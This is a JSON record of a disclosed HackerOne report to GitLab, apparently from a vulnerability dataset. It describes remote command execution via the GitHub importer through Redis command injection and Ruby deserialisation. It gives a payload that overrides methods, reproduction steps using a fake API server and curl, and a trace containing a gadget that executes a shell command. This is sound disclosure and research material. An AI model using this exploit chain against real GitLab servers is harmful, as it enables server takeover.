{
  "reported_to": "GitLab",
  "reported_by": "vakzz ",
  "title": "Remote Command Execution via Github import",
  "content": "\nSummary\nThis is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20import and allows arbitrary redis commands to be injected when imported a GitHub repository.\nWhen importing a GitHub repo the api client uses Sawyer for handling the responses. This takes a json hash and converts it into a ruby class that has methods matching all of the keys:\nhttps://github.com/lostisland/sawyer/blob/v0.9.2/lib/sawyer/resource.rb#L106-L110\nCode 414 Bytes\n1    def self.attr_accessor(*attrs)\n2      attrs.each do |attribute|\n3        class_eval do\n4          define_method attribute do\n5            @attrs[attribute.to_sym]\n6          end\n7\n8          define_method \"#{attribute}=\" do |value|\n9            @attrs[attribute.to_sym] = value\n10          end\n11\n12          define_method \"#{attribute}?\" do\n13            !!@attrs[attribute.to_sym]\n14          end\n15        end\n16      end\n17    end\nThis happens recursively, and allows for any method to be overridden including built-in methods such as to_s.\nThe redis gem uses to_s and bytesize to generate the RESP command, so if a Sawyer::Resource is ever passed in that has a controllable hash it can allow arbitrary redis commands to be injected into the stream as the string will be shorter than the $ size provided (see https://redis.io/docs/reference/protocol-spec/)\nhttps://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L20\nCode 87 Bytes\n1            i = i.to_s\n2            command << \"$#{i.bytesize}\"\n3            command << i\nThe patch for CVE-2022-2884 added validation to Gitlab::Cache::Import::Caching but there is another spot where the Sawyer::Resource is passed to redis:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/github_import/importer/repository_importer.rb#L55\nCode 519 Bytes\n1       def import_repository\n2          project.ensure_repository\n3\n4          refmap = Gitlab::GithubImport.refmap\n5          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)\n6\n7          project.change_head(default_branch) if default_branch\n8\n9          # The initial fetch can bring in lots of loose refs and objects.\n10          # Running a `git gc` will make importing pull requests faster.\n11          Repositories::HousekeepingService.new(project, :gc).execute\n12\n13          true\n14        end\nThe default_branch param comes from the client repository (which is a nested Sawyer::Resource of attacker controlled data), and is passed to change_head which then calls branch_exists? and branch_names_include? which passes the value to redis:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/repository_cache_adapter.rb#L71\nCode 614 Bytes\n1        define_method(\"#{name}_include?\") do |value|\n2          ivar = \"@#{name}_include\"\n3          memoized = instance_variable_get(ivar) || {}\n4          lookup = proc { __send__(name).include?(value) } # rubocop:disable GitlabSecurity/PublicSend\n5\n6          next memoized[value] if memoized.key?(value)\n7\n8          memoized[value] =\n9            if strong_memoized?(name)\n10              lookup.call\n11            else\n12              result, exists = redis_set_cache.try_include?(name, value)\n13\n14              exists ? result : lookup.call\n15            end\n16\n17          instance_variable_set(ivar, memoized)[value]\n18        end\nSo by returning an api response with a default_branch that overrides to_s and bytesize you can call arbitrary redis commands:\nCode 199 Bytes\n1        {\n2            \"default_branch\": {\n3                \"to_s\": {\n4                    \"to_s\": 'ggg\\r\\nINJECT_RESP_HERE',\n5                    \"bytesize\": 3,\n6                }\n7            }\n8        }\nThis can be combined with a call to Marshal.load when loading a _gitlab_session to execute a deserialisation gadget (such as https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) and gain RCE.\nSteps to reproduce\nedit gen_payload3.rb (F1882976) and change the command at git_set, that will be the command that is executed\nchange the session:gitlab:gggg to be something other than gggg\nrun ruby ./gen_payload3.rb and copy the payload\nedit fake_server3.py (F1882972) and update the payload\nrun ngrok http 5000 and copy the url\nedit fake_server3.py and update the ngrok url\nrun the server with FLASK_APP=fake_server3.py flask run\nrun curl --request POST --url \"http://gitlab.wbowling.info/api/v4/import/github\" --header \"content-type: application/json\" --header \"PRIVATE-TOKEN: API_TOKEN\" --data \"{\\\"personal_access_token\\\": \\\"fake_token\\\",\\\"repo_id\\\": \\\"12345\\\",\\\"target_namespace\\\": \\\"root\\\",\\\"new_name\\\": \\\"gh-import-$RANDOM\\\",\\\"github_hostname\\\": \\\"https://9895-45-248-49-157.ngrok.io\\\"}\" replacing gitlab.wbowling.info with your gitlab url, API_TOKEN with a valid gitlab token, target_namespace with a namespace you have access to, and github_hostname with your ngrok url\nwait a minute or so, you should see requests coming in to the flask app. Once you see a request for /api/v3/repos/fake/name that should be long enough, there will also be an error in /var/log/gitlab/gitlab-rails/exceptions_json.log about comparison of String with 0 failed\nrun curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg' replacing gitlab.wbowling.info with your gitlab url and gggg with the string you used in gen_payload3.rb\nthe payload should have executed\nImpact\nAllows an attacker with the ability to import a github repo to execute arbitrary commands on the server\nExamples\nSee attached scripts and steps to reproduce\nWhat is the current bug behavior?\nThe Sawyer::Resource object is passed around and allows an attacker to override builtin methods\nWhat is the expected correct behavior?\nThe Sawyer::Resource has a to_h method which could potentially be used to ensure a plain has it passed around.\nRelevant logs and/or screenshots\nredis command ends up as:\nCode 715 Bytes\n1[pid  1362] read(67, \"*1\\r\\n$5\\r\\nmulti\\r\\n*3\\r\\n$9\\r\\nsismember\\r\\n$53\\r\\ncache:gitlab:branch_names:root/gh-import-7316:102:set\\r\\n$3\\r\\nggg\\r\\n*3\\r\\n$3\\r\\nset\\r\\n$19\\r\\nsession:gitlab:jjjj\\r\\n$330\\r\\n\\4\\10[\\10c\\25Gem::SpecFetcherc\\23Gem::InstallerU:\\25Gem::Requirement[\\6o:\\34Gem::Package::TarReader\\6:\\10@ioo:\\24Net::BufferedIO\\7;\\7o:#Gem::Package::TarReader::Entry\\7:\\n@readi\\0:\\f@headerI\\\"\\10aaa\\6:\\6ET:\\22@debug_outputo:\\26Net::WriteAdapter\\7:\\f@socketo:\\24Gem::RequestSet\\7:\\n@setso;\\16\\7;\\17m\\vKernel:\\17@method_id:\\vsystem:\\r@git_setI\\\"\\33echo id > /tmp/vakzz22\\6;\\fT;\\22:\\fresolve\\r\\n*2\\r\\n$6\\r\\nexists\\r\\n$53\\r\\ncache:gitlab:branch_names:root/gh-import-7316:102:set\\r\\n*1\\r\\n$4\\r\\nexec\\r\\n\", 16384) = 570\nerror in the logs\nCode 4.48 KiB\n1{\"severity\":\"ERROR\",\"time\":\"2022-08-25T03:57:55.006Z\",\"correlation_id\":\"01GB9JCB7TYNH6F7J7W7NFQTDT\",\"exception.class\":\"ArgumentError\",\"exception.message\":\"comparison of String with 0 failed\",\"exception.backtrace\":[\"lib/gitlab/set_cache.rb:60:in `block in try_include?'\",\"lib/gitlab/redis/wrapper.rb:23:in `block in with'\",\"lib/gitlab/redis/wrapper.rb:23:in `with'\",\"lib/gitlab/set_cache.rb:74:in `with'\",\"lib/gitlab/set_cache.rb:59:in `try_include?'\",\"lib/gitlab/repository_cache_adapter.rb:71:in `block in cache_method_as_redis_set'\",\"app/models/repository.rb:288:in `branch_exists?'\",\"app/models/repository.rb:1161:in `change_head'\",\"app/models/concerns/has_repository.rb:17:in `change_head'\",\"lib/gitlab/github_import/importer/repository_importer.rb:55:in `import_repository'\",\"lib/gitlab/github_import/importer/repository_importer.rb:37:in `execute'\",\"app/workers/gitlab/github_import/stage/import_repository_worker.rb:31:in `import'\",\"app/workers/concerns/gitlab/github_import/stage_methods.rb:37:in `try_import'\",\"app/workers/concerns/gitlab/github_import/stage_methods.rb:20:in `perform'\",\"lib/gitlab/database/load_balancing/sidekiq_server_middleware.rb:26:in `call'\",\"lib/gitlab/sidekiq_middleware/duplicate_jobs/strategies/until_executing.rb:16:in `perform'\",\"lib/gitlab/sidekiq_middleware/duplicate_jobs/duplicate_job.rb:58:in `perform'\",\"lib/gitlab/sidekiq_middleware/duplicate_jobs/server.rb:8:in `call'\",\"lib/gitlab/sidekiq_middleware/worker_context.rb:9:in `wrap_in_optional_context'\",\"lib/gitlab/sidekiq_middleware/worker_context/server.rb:19:in `block in call'\",\"lib/gitlab/application_context.rb:110:in `block in use'\",\"lib/gitlab/application_context.rb:110:in `use'\",\"lib/gitlab/application_context.rb:52:in `with_context'\",\"lib/gitlab/sidekiq_middleware/worker_context/server.rb:17:in `call'\",\"lib/gitlab/sidekiq_status/server_middleware.rb:7:in `call'\",\"lib/gitlab/sidekiq_versioning/middleware.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `block in call'\",\"lib/gitlab/database/query_analyzer.rb:37:in `within'\",\"lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `call'\",\"lib/gitlab/sidekiq_middleware/admin_mode/server.rb:14:in `call'\",\"lib/gitlab/sidekiq_middleware/instrumentation_logger.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/batch_loader.rb:7:in `call'\",\"lib/gitlab/sidekiq_middleware/extra_done_log_metadata.rb:7:in `call'\",\"lib/gitlab/sidekiq_middleware/request_store_middleware.rb:10:in `block in call'\",\"lib/gitlab/with_request_store.rb:17:in `enabling_request_store'\",\"lib/gitlab/with_request_store.rb:10:in `with_request_store'\",\"lib/gitlab/sidekiq_middleware/request_store_middleware.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:76:in `block in call'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `block in instrument'\",\"lib/gitlab/metrics/background_transaction.rb:33:in `run'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `instrument'\",\"lib/gitlab/sidekiq_middleware/server_metrics.rb:75:in `call'\",\"lib/gitlab/sidekiq_middleware/monitor.rb:10:in `block in call'\",\"lib/gitlab/sidekiq_daemon/monitor.rb:49:in `within_job'\",\"lib/gitlab/sidekiq_middleware/monitor.rb:9:in `call'\",\"lib/gitlab/sidekiq_middleware/size_limiter/server.rb:13:in `call'\",\"lib/gitlab/sidekiq_logging/structured_logger.rb:21:in `call'\"],\"user.username\":\"root\",\"tags.program\":\"sidekiq\",\"tags.locale\":\"en\",\"tags.feature_category\":\"importers\",\"tags.correlation_id\":\"01GB9JCB7TYNH6F7J7W7NFQTDT\",\"extra.sidekiq\":{\"retry\":5,\"queue\":\"github_importer:github_import_stage_import_repository\",\"version\":0,\"queue_namespace\":\"github_importer\",\"dead\":false,\"memory_killer_memory_growth_kb\":50,\"memory_killer_max_memory_growth_kb\":300000,\"status_expiration\":1800,\"args\":[\"[FILTERED]\"],\"class\":\"Gitlab::GithubImport::Stage::ImportRepositoryWorker\",\"jid\":\"f6fd0ce785d6cc8e91b5b776\",\"created_at\":1661399872.1377518,\"correlation_id\":\"01GB9JCB7TYNH6F7J7W7NFQTDT\",\"meta.caller_id\":\"RepositoryImportWorker\",\"meta.remote_ip\":\"192.168.0.149\",\"meta.feature_category\":\"importers\",\"meta.user\":\"root\",\"meta.project\":\"root/gh-import-7316\",\"meta.root_namespace\":\"root\",\"meta.client_id\":\"user/1\",\"meta.root_caller_id\":\"POST /api/:version/import/github\",\"worker_data_consistency\":\"always\",\"idempotency_key\":\"resque:gitlab:duplicate:github_importer:github_import_stage_import_repository:797f481f035041a27c840a58899f1557fc2a102dfc05bc2cb918651c86da1219\",\"size_limiter\":\"validated\",\"enqueued_at\":1661399872.1395159},\"extra.import_type\":\"github\",\"extra.project_id\":102,\"extra.source\":\"Gitlab::GithubImport::Stage::ImportRepositoryWorker\"}\nOutput of checks\nResults of GitLab environment info\nCode 813 Bytes\n1System information\n2System:\t\tUbuntu 20.04\n3Proxy:\t\tno\n4Current User:\tgit\n5Using RVM:\tno\n6Ruby Version:\t2.7.5p203\n7Gem Version:\t3.1.6\n8Bundler Version:2.3.15\n9Rake Version:\t13.0.6\n10Redis Version:\t6.2.7\n11Sidekiq Version:6.4.0\n12Go Version:\tunknown\n13\n14GitLab information\n15Version:\t15.3.1-ee\n16Revision:\t518311979e3\n17Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n18DB Adapter:\tPostgreSQL\n19DB Version:\t12.10\n20URL:\t\thttp://gitlab.wbowling.info\n21HTTP Clone URL:\thttp://gitlab.wbowling.info/some-group/some-project.git\n22SSH Clone URL:\tgit@gitlab.wbowling.info:some-group/some-project.git\n23Elasticsearch:\tno\n24Geo:\t\tno\n25Using LDAP:\tno\n26Using Omniauth:\tyes\n27Omniauth Providers:\n28\n29GitLab Shell\n30Version:\t14.10.0\n31Repository storage paths:\n32- default: \t/var/opt/gitlab/git-data/repositories\n33GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\nImpact\nAllows an attacker with the ability to import a github repo to execute arbitrary commands on the server\n\n",
  "severity": [
    9.9,
    null
  ],
  "bounty": 33510,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1665101940,
  "report_url": "https://hackerone.com/reports/1679624",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Prepare a malicious GitHub repository with a specially crafted default_branch field that overrides to_s and bytesize methods to inject Redis commands."
    ],
    [
      2,
      "Set up a fake GitHub API server to serve the malicious repository data when GitLab attempts to import it."
    ],
    [
      3,
      "Trigger the GitHub repository import in GitLab using the API, pointing to the fake GitHub server."
    ],
    [
      4,
      "Wait for GitLab to process the import and execute the injected Redis commands, which can include deserialization gadgets for RCE."
    ],
    [
      5,
      "Access the GitLab instance with a manipulated session cookie to trigger the deserialization and execute arbitrary commands."
    ]
  ],
  "vuln_description": "The vulnerability allows remote command execution via GitHub repository import in GitLab. By manipulating the default_branch field in the GitHub API response, an attacker can inject arbitrary Redis commands. This is possible due to improper handling of Sawyer::Resource objects in GitLab's GitHub importer, which allows method overriding that affects Redis command generation. The attack can be chained with deserialization gadgets to achieve remote code execution.",
  "reason": "This vulnerability requires deep understanding of multiple components: GitHub API response handling, Redis protocol generation, Ruby method overriding, and deserialization attacks. The attacker must carefully craft a malicious response that maintains valid structure while containing the exploit payload. The interaction between these components is non-obvious and requires precise manipulation of application state during the import process.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves manipulating the GitHub import process to inject arbitrary Redis commands through a Sawyer::Resource object, which is not directly related to authentication or authorization bypasses. The methodology described focuses on testing authentication and authorization boundaries by swapping user sessions and resource IDs, which doesn't apply here since the exploit involves a different attack vector (command injection via API response manipulation).",
    "is_detectable": false
  }
}